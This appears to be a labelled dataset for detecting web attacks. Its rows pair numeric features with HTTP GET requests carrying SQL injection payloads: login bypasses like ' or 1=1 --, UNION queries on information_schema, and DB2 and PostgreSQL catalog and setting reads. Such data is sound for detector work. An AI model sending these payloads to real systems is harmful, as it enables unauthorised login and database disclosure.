63,1,200,7052,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,4801,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5695,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,6884,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5495,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,1002,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,4995,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,2758,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,6791,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5756,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5862,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5850,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,2584,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,6264,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,2454,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
32,1,200,4409,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,6343,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,3812,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,7987,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,5078,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,1900,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,1851,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,1175,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,4458,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,2668,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,4151,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,2602,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,3447,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,6741,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,2318,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,6733,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,3395,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,2044,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,1826,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,5890,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
51,1,200,1356,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,2638,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7803,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,5249,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,5776,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7476,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,4097,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3269,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,2111,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,4450,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3611,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,6422,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,6678,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,1295,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3210,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,5486,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,6738,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
88,1,200,2204,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,2281,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,5964,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,1970,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,3199,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,5878,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,1796,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,2377,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,4853,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,2311,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,2197,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,4635,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,6150,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,1637,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,6279,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,2483,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,2730,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,4042,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,7913,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,3811,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,3007,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,1652,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,3812,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
32,1,200,3685,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,2987,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,1369,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,5677,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,5694,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,3828,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,5656,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,2760,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,7767,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,7569,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,7406,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,3966,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,1157,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,4869,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,3659,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,7862,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,4668,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,2720,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,6645,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
32,1,200,3093,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
21,1,200,1300,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,1199,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,7971,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,3109,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,7212,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,3333,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,1849,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,5759,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,3090,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,4699,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,6403,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,6481,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,7561,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,3693,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,4441,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,4078,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,6464,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,6442,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,2337,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,3635,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,7787,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,7668,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,2407,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,3441,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,2364,7,2,6,1,1,GET ?id=' -- HTTP/1.1
34,1,200,6930,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,2384,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,2347,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,3761,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,4384,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,2301,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,6035,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,2726,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,6480,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,6214,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,3074,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,1251,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,7790,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,3905,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,2460,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,7506,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,4748,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,6412,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
26,2,200,6624,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4011,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,6800,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4837,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,7044,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,3132,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,3206,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,7970,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,2663,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,6017,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4069,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,6942,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4234,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,2337,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,5764,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,2718,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,5808,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4589,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,2597,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,6038,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,7605,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,1373,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,3927,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4989,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4165,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,2108,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,3647,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,1723,7,7,6,2,1,GET login/?id='&' HTTP/1.1
69,1,200,3115,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,7931,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4255,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2976,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,5205,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,3344,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2028,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,7127,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2311,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,6022,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,3125,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4532,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4947,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,7717,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2374,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,1691,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
44,1,200,6148,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,2954,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,5902,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4930,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,7306,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4038,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,7221,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,7169,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4732,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4600,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,6912,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,6041,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,2261,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,6709,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4338,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4881,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,1316,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4867,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,1149,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,5522,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4596,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
38,1,200,2277,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,7194,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,4045,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,6975,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,5949,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,6961,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,2425,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,7350,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,7858,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,6714,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,6119,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,5830,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,1074,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,7704,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,3095,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,4454,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,4675,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,3053,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,6368,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,4560,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,5792,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,1137,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,1921,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,3296,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,7346,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,4561,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,5670,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,2814,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,1666,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
35,1,200,3385,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,6597,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,6734,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,1103,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,2844,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,6936,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,6521,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,7145,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,1007,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,1570,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,6970,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,7673,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,2595,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,2867,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,7248,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,2535,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
20,1,200,1745,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,5267,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,7528,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,6750,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,4074,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,6256,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,5209,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,4922,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,3612,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,2015,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,4339,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,2396,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,3892,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,1321,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,1949,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,2498,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,1690,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,6152,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,4033,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,7115,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,1512,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,2552,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,5677,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,5389,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,6306,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,5006,7,2,3,1,1,GET ?id=" " HTTP/1.1
20,1,200,1877,7,2,3,1,1,GET ?id=" " HTTP/1.1
19,1,200,3424,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,6360,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,6260,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,6210,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,4181,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,6368,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,6859,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,1592,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,6237,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,7290,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,5393,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,1586,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,7384,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,7908,7,2,5,1,1,GET ?id='# HTTP/1.1
68,1,200,2667,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,5929,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,6754,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,5285,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1594,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2507,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,7205,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2749,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1700,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,3458,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2287,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1598,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,7037,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1302,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,3115,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1960,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,7463,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,6312,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2357,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2524,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1524,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
26,1,200,5580,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,6684,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,1941,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,5360,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,6648,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3307,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3828,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
